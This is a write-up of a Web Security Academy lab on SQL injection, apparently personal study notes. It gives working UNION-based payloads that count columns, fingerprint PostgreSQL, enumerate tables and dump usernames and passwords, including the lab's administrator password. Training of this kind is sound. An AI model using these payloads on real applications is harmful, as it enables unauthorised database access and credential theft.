# SQL injection UNION attack, retrieving data from other tables

1. SQLi: 
    - product category filter.
    - The database contains a different table called users.
    - columns called username and password.
2. Goal:
    - retrieves all usernames and passwords.
    - log in as the `administrator` user.

### Analysis
- Website target: `https://0ad000e50462a701804d8a9700d2004f.web-security-academy.net/`
- Use Burp suite.
- `ctrl + u`: URL encode.

1. Find the number of columns.
```sql
' order by 2--
'-- I found 2 columns.
```

2. Find data type of these columns.
```sql
' union select 'a', 'a'--
'-- All of columns are text.
```

3. Find the version of database.
```sql
SELECT version() --PostgreSQL
' UNION SELECT version() ,NULL--
'-- PostgreSQL 12.16
```

4. Output the table name of this database.
```sql
SELECT * FROM information_schema.tables

' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables--
'-- Table name: users.
```

5. Output the usernmae and password. 
```sql
--We know the column names.
-- username and password.

' union select username, password from users--
'-- username: administrator
-- password: wsubf3g41mj6qfcyk53k
```